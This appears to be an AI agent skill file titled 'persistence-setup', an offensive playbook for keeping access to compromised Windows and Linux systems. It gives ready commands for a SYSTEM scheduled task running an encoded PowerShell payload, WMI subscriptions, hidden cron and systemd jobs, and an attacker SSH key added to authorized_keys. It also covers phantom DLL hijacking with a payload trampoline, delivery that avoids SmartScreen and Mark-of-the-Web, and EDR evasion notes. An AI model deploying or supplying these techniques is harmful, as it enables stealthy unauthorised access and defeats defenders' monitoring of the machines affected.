---
name: persistence-setup
description: Persistence mechanism deployment for maintaining access. Covers multiple methods with detection risk ratings.
---

# Persistence Setup

## Method Selection Guide

| Method | Platform | Detection Risk | Removal Difficulty |
|--------|----------|----------------|-------------------|
| Scheduled Task | Windows | Medium | Easy |
| Registry Run Key | Windows | High | Easy |
| Service Creation | Windows | Medium | Medium |
| WMI Event Sub | Windows | Low-Medium | Hard |
| Cron Job | Linux | Medium | Easy |
| Systemd Service | Linux | Low-Medium | Medium |
| SSH Authorized Keys | Linux | Low | Easy |
| DLL Search-Order Hijack (classic) | Windows | Medium | Easy |
| DLL Search-Order Hijack (phantom, signed host) | Windows | **Low** | Easy |
| Web Shell | Web Server | Varies | Varies |

## Windows Persistence

### Scheduled Task (Medium Risk)
```bash
schtasks /create /tn "SystemUpdate" /tr "cmd /c powershell -enc <payload>" /sc onlogon /ru SYSTEM
```

### WMI Event Subscription (Low-Medium Risk)
```powershell
# Requires PowerShell; persists across reboots, hard to detect
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="Updater"; EventNameSpace="root\cimv2"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=12 AND TargetInstance.Minute=30"}
```

### DLL Search Order Hijacking — classic (Medium Risk)
- Place a malicious DLL named after a DLL the application loads into the application directory (or any directory earlier in the search order).
- Works because `LoadLibraryEx`/implicit imports resolve by name through: app dir → system dirs → CWD (if enabled) → `%PATH%`.
- Risks: overwriting a real DLL breaks the app; a new DLL for a system name is easy to spot with a directory diff.

### DLL Search Order Hijacking — phantom / signed host (Low Risk)
The "phantom" variant never touches the legitimate DLL: you drop a **differently-located, same-named** DLL into a directory the host searches *before* System32, triggered by a **signed Windows binary that normally runs elevated**. Classic target pattern: a Windows-signed host inside `C:\Windows\WinSxS\...` executed by a SYSTEM scheduled task, whose import resolves from a writable directory (e.g. `%ProgramData%`, `C:\Windows\Temp`, the task's working directory).

**Why it is low risk**
- Nothing in `System32`/WinSxS is modified → no file-integrity or signature anomaly on the host binary.
- No service, driver, or Run key → few registry artefacts.
- Removal = delete one file; the real DLL was never replaced.

**Trigger placement: exports, not `DllMain`**
`DllMain` runs under the loader lock — doing real work there (network, `LoadLibrary`, waiting) deadlocks or is killed by loader timeouts. Put the payload in an **exported function the host actually calls**, and keep `DllMain` to bookkeeping only:
- Identify the host's imported names first: `dumpbin /imports host.exe` (or `objdump -p host.exe | grep "DLL Name"` + `DLL Name: <name>` then `dumpbin /exports` of that DLL).
- Export the same symbol(s). A hand-written trampoline (`jmp` to the real implementation, resolved with `GetProcAddress` on the genuine DLL) keeps the host functional:
  ```asm
  ; trampoline.asm — forward to the genuine export after the payload fires
  extern RealFunc:qword
  public HostCalledExport
  HostCalledExport:
      ; payload (spawn, callback, inject) …
      jmp qword ptr [RealFunc]
  ```
  Or use export forwarding in the `.def` file (`HostCalledExport = legit.HostCalledExport`) when no payload action is needed on that call path.
- Prefer a benign, rarely-called export (e.g. a version/query helper) so the payload fires only on the host's scheduled run, not at every process start.

**Candidate enumeration checklist**
1. Elevated, signed, scheduled hosts:
   ```powershell
   schtasks /query /fo csv /v | ConvertFrom-Csv |
     Where-Object { $_.'Run As User' -match 'SYSTEM|Administrators' } |
     Select-Object TaskName, 'Task To Run'
   Get-AuthenticodeSignature C:\Windows\System32\ngentask.exe | Format-List Status, SignerCertificate
   ```
2. Writable directories earlier in that host's search order:
   ```powershell
   icacls "C:\ProgramData" | Select-String "Everyone|Users"
   # directories the task's working dir / PATH entries point at
   ```
3. Missing-DLL / import squatting candidates (a name the host imports that does not exist in its directory):
   ```powershell
   dumpbin /imports "C:\Windows\System32\ngentask.exe" | Select-String "\.dll"
   Get-ChildItem "C:\Windows\System32\ngentask.exe" -Filter *.dll
   ```
   Also check `tasklist /m` for a loaded module whose path is outside `System32` — that host already resolves by name.
4. Confirm the host runs on a schedule (`Get-ScheduledTask ... | Get-ScheduledTaskInfo`) so the trigger is predictable; otherwise wait for the user logon/reboot.

**Delivery hygiene (VHDX)**
- Copy the DLL into a mounted VHDX and dismount, then attach/copy on target — avoids Mark-of-the-Web and `Zone.Identifier` that SmartScreen/EDR flags on downloads.
- Preserve timestamps and match the version resource of the host's expected DLL (`robocopy /COPY:DAT`, `sigcheck -v` for reference metadata).
- Name the file exactly as imported; avoid a `.dll.tmp` staging name that a directory listing would expose.

**Verification**
```powershell
Get-Process <host> | Select-Object -ExpandProperty Modules |
  Where-Object { $_.FileName -notlike "C:\Windows\System32\*" } |
  Select-Object ModuleName, FileName
tasklist /m /fi "imagename eq <host>.exe"
```
- Confirm the module path is your planted file (not System32) and that the payload's callback fires on the host's next scheduled run.
- Re-run the host manually once (`<host>.exe`) in a lab snapshot before delivery; a broken export usually shows as an immediate `0xc0000139` (entry point not found).

**OPSEC notes**
- Keep the planted DLL's name/version consistent with the expected import; a mismatched version resource is a common EDR heuristic.
- Do not touch the WinSxS copy; if the host is signed and started from WinSxS, the app-dir/CWD copy is what loads — verify with the module list, not assumptions.
- Remove by deleting the planted file; reboot/logoff cleans the loaded image.

## Linux Persistence

### Cron (Medium Risk)
```bash
(crontab -l 2>/dev/null; echo "0 * * * * /usr/bin/.systemd") | crontab -
```

### Systemd Service (Low-Medium Risk)
```ini
[Unit]
Description=System Updates
After=network.target

[Service]
ExecStart=/usr/bin/.update.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

### SSH Authorized Keys (Low Risk)
```bash
mkdir -p ~/.ssh && echo "ssh-rsa AAAA... attacker@ctrl" >> ~/.ssh/authorized_keys
```
